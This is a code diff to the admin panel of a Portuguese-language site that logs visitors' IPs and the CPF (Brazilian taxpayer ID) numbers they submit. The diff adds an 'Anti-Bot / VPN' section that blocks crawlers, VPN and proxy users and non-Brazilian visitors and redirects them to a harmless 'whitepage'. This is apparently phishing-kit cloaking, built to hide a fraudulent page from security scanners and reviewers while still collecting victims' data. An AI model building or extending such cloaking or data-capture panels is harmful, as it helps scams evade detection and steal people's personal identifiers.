@@ -5,7 +5,8 @@ import {
   ChevronDown, Landmark, Phone, CreditCard, Eye, Building2, KeyRound,
   Gavel, User, Clock, CheckCircle, LogOut, Calendar, TrendingUp,
   Users, Bell, RefreshCw, Upload, AlertCircle, Globe, Monitor, Smartphone,
-  ArrowUpDown, Database, Activity, Settings, MessageSquare
+  ArrowUpDown, Database, Activity, Settings, MessageSquare, Shield, ShieldOff,
+  ShieldAlert, Ban, Link, ToggleLeft, ToggleRight
 } from 'lucide-react'
 
 function formatCPFInput(value) {
@@ -977,21 +978,17 @@ export default function AdminPage() {
                 </div>
                 <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                   <div className="flex items-center gap-3 mb-2">
-                    <Monitor className="w-5 h-5 text-violet-500" />
-                    <p className="text-xs text-gray-500">Desktop</p>
+                    <Ban className="w-5 h-5 text-red-500" />
+                    <p className="text-xs text-gray-500">Bloqueados</p>
                   </div>
-                  <p className="text-2xl font-bold text-white">
-                    {acessosStats.dispositivos?.find(d => d.dispositivo?.toLowerCase().includes('desktop'))?.count || 0}
-                  </p>
+                  <p className="text-2xl font-bold text-red-400">{acessosStats.bloqueados || 0}</p>
                 </div>
                 <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
                   <div className="flex items-center gap-3 mb-2">
-                    <Smartphone className="w-5 h-5 text-amber-500" />
-                    <p className="text-xs text-gray-500">Mobile</p>
+                    <CheckCircle className="w-5 h-5 text-emerald-500" />
+                    <p className="text-xs text-gray-500">Permitidos</p>
                   </div>
-                  <p className="text-2xl font-bold text-white">
-                    {acessosStats.dispositivos?.find(d => d.dispositivo?.toLowerCase().includes('mobile'))?.count || 0}
-                  </p>
+                  <p className="text-2xl font-bold text-emerald-400">{(acessosStats.total || 0) - (acessosStats.bloqueados || 0)}</p>
                 </div>
               </div>
 
@@ -1002,10 +999,10 @@ export default function AdminPage() {
                     <tr className="border-b border-white/5">
                       <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Data/Hora</th>
                       <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">IP</th>
-                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">CPF Consultado</th>
+                      <th className="text-center px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Status</th>
                       <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Dispositivo</th>
-                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Navegador</th>
-                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">País/Cidade</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">País</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">CPF</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-white/5">
@@ -1018,7 +1015,7 @@ export default function AdminPage() {
                         </td>
                       </tr>
                     ) : acessos.map(acesso => (
-                      <tr key={acesso.id} className="hover:bg-white/5 transition-colors">
+                      <tr key={acesso.id} className={`hover:bg-white/5 transition-colors ${acesso.bloqueado ? 'bg-red-500/5' : ''}`}>
                         <td className="px-6 py-4">
                           <div className="flex items-center gap-2">
                             <Clock className="w-4 h-4 text-gray-500" />
@@ -1030,8 +1027,21 @@ export default function AdminPage() {
                         <td className="px-6 py-4">
                           <span className="text-white font-mono text-sm">{acesso.ip || '-'}</span>
                         </td>
-                        <td className="px-6 py-4">
-                          <span className="text-white text-sm">{acesso.cpf_consultado || '-'}</span>
+                        <td className="px-6 py-4 text-center">
+                          {acesso.bloqueado ? (
+                            <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-red-500/20 text-red-400 border border-red-500/30">
+                              <Ban className="w-3 h-3" />
+                              {acesso.motivo_bloqueio === 'bot' && 'Bot'}
+                              {acesso.motivo_bloqueio === 'vpn' && 'VPN'}
+                              {acesso.motivo_bloqueio === 'pais' && 'Fora BR'}
+                              {!acesso.motivo_bloqueio && 'Bloqueado'}
+                            </span>
+                          ) : (
+                            <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
+                              <CheckCircle className="w-3 h-3" />
+                              OK
+                            </span>
+                          )}
                         </td>
                         <td className="px-6 py-4">
                           <div className="flex items-center gap-2">
@@ -1044,15 +1054,13 @@ export default function AdminPage() {
                           </div>
                         </td>
                         <td className="px-6 py-4">
-                          <span className="text-gray-300 text-sm">{acesso.navegador || '-'}</span>
+                          <div className="flex items-center gap-2">
+                            <Globe className="w-4 h-4 text-blue-500" />
+                            <span className="text-gray-300 text-sm">{acesso.pais || 'Brasil'}</span>
+                          </div>
                         </td>
                         <td className="px-6 py-4">
-                          <div className="flex items-center gap-2">
-                            <Globe className="w-4 h-4 text-emerald-500" />
-                            <span className="text-gray-300 text-sm">
-                              {acesso.pais || 'Brasil'}{acesso.cidade ? `, ${acesso.cidade}` : ''}
-                            </span>
-                          </div>
+                          <span className="text-gray-300 text-sm">{acesso.cpf_consultado || '-'}</span>
                         </td>
                       </tr>
                     ))}
@@ -1141,6 +1149,110 @@ export default function AdminPage() {
                         ))}
                       </div>
                     </div>
+                  </div>
+
+                </div>
+              </div>
+
+              {/* Proteção Anti-Bot/VPN */}
+              <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-6">
+                <div className="flex items-center gap-3 mb-6">
+                  <div className="w-10 h-10 bg-red-500/10 rounded-xl flex items-center justify-center">
+                    <Shield className="w-5 h-5 text-red-500" />
+                  </div>
+                  <div>
+                    <h3 className="text-lg font-semibold text-white">Proteção Anti-Bot / VPN</h3>
+                    <p className="text-sm text-gray-500">Bloqueie acessos suspeitos e redirecione para whitepage</p>
+                  </div>
+                </div>
+
+                <div className="space-y-4">
+                  {/* Toggle Proteção Ativa */}
+                  <div className="flex items-center justify-between p-4 bg-[#0f172a] rounded-xl border border-white/5">
+                    <div className="flex items-center gap-3">
+                      {config.protecao_ativa === 'true' ? (
+                        <Shield className="w-5 h-5 text-emerald-500" />
+                      ) : (
+                        <ShieldOff className="w-5 h-5 text-gray-500" />
+                      )}
+                      <div>
+                        <p className="text-white font-medium">Proteção Ativa</p>
+                        <p className="text-xs text-gray-500">Ativar/desativar todos os bloqueios</p>
+                      </div>
+                    </div>
+                    <button
+                      onClick={() => setConfig({ ...config, protecao_ativa: config.protecao_ativa === 'true' ? 'false' : 'true' })}
+                      className={`w-14 h-8 rounded-full transition-colors relative ${config.protecao_ativa === 'true' ? 'bg-emerald-500' : 'bg-gray-600'}`}
+                    >
+                      <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-all ${config.protecao_ativa === 'true' ? 'right-1' : 'left-1'}`} />
+                    </button>
+                  </div>
+
+                  {/* Toggle Bloquear Bots */}
+                  <div className="flex items-center justify-between p-4 bg-[#0f172a] rounded-xl border border-white/5">
+                    <div className="flex items-center gap-3">
+                      <Ban className="w-5 h-5 text-orange-500" />
+                      <div>
+                        <p className="text-white font-medium">Bloquear Bots</p>
+                        <p className="text-xs text-gray-500">Bloqueia crawlers, scrapers e automações</p>
+                      </div>
+                    </div>
+                    <button
+                      onClick={() => setConfig({ ...config, bloquear_bots: config.bloquear_bots === 'true' ? 'false' : 'true' })}
+                      className={`w-14 h-8 rounded-full transition-colors relative ${config.bloquear_bots === 'true' ? 'bg-emerald-500' : 'bg-gray-600'}`}
+                    >
+                      <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-all ${config.bloquear_bots === 'true' ? 'right-1' : 'left-1'}`} />
+                    </button>
+                  </div>
+
+                  {/* Toggle Bloquear VPN */}
+                  <div className="flex items-center justify-between p-4 bg-[#0f172a] rounded-xl border border-white/5">
+                    <div className="flex items-center gap-3">
+                      <ShieldAlert className="w-5 h-5 text-violet-500" />
+                      <div>
+                        <p className="text-white font-medium">Bloquear VPN/Proxy</p>
+                        <p className="text-xs text-gray-500">Bloqueia acessos via VPN, proxy ou hosting</p>
+                      </div>
+                    </div>
+                    <button
+                      onClick={() => setConfig({ ...config, bloquear_vpn: config.bloquear_vpn === 'true' ? 'false' : 'true' })}
+                      className={`w-14 h-8 rounded-full transition-colors relative ${config.bloquear_vpn === 'true' ? 'bg-emerald-500' : 'bg-gray-600'}`}
+                    >
+                      <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-all ${config.bloquear_vpn === 'true' ? 'right-1' : 'left-1'}`} />
+                    </button>
+                  </div>
+
+                  {/* Toggle Bloquear Fora do Brasil */}
+                  <div className="flex items-center justify-between p-4 bg-[#0f172a] rounded-xl border border-white/5">
+                    <div className="flex items-center gap-3">
+                      <Globe className="w-5 h-5 text-blue-500" />
+                      <div>
+                        <p className="text-white font-medium">Apenas Brasil</p>
+                        <p className="text-xs text-gray-500">Bloqueia acessos de fora do Brasil</p>
+                      </div>
+                    </div>
+                    <button
+                      onClick={() => setConfig({ ...config, bloquear_fora_brasil: config.bloquear_fora_brasil === 'true' ? 'false' : 'true' })}
+                      className={`w-14 h-8 rounded-full transition-colors relative ${config.bloquear_fora_brasil === 'true' ? 'bg-emerald-500' : 'bg-gray-600'}`}
+                    >
+                      <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-all ${config.bloquear_fora_brasil === 'true' ? 'right-1' : 'left-1'}`} />
+                    </button>
+                  </div>
+
+                  {/* URL da Whitepage */}
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
+                      <Link className="w-3 h-3 inline mr-1" />
+                      URL da Whitepage (redirecionamento)
+                    </label>
+                    <input
+                      type="url"
+                      value={config.whitepage_url || ''}
+                      onChange={e => setConfig({ ...config, whitepage_url: e.target.value })}
+                      placeholder="https://google.com"
+                      className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm"
+                    />
+                    <p className="text-xs text-gray-500 mt-1">Visitantes bloqueados serão redirecionados para esta URL</p>
                   </div>
 
                   <button
